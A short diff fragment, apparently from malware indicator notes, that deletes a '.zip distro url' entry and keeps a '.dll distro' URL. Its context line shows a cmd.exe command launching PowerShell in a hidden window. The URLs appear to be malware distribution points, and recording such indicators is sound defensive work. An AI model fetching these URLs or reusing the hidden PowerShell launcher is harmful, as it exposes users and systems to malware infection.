@@ -19,10 +19,6 @@ cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyl
 
 *************************************************
 
-.zip distro url
-
-https://ilikeshop.cl/rsqq/rsqq.php
-
 .dll distro
 
 https://hotellosmirtos.com/sjn/Tn0Q3nieE
